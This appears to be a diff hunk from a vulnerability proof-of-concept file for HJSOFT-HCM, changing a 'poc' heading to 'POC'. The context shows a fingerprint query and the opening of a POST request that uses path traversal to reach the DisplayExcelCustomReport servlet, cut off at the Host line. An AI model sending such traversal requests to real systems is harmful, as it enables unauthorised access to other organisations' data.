@@ -5,7 +5,7 @@
 app="HJSOFT-HCM"
 ```
 
-## poc
+## POC
 ```
 POST /templates/attestation/../../servlet/DisplayExcelCustomReport HTTP/1.1
 Host: 
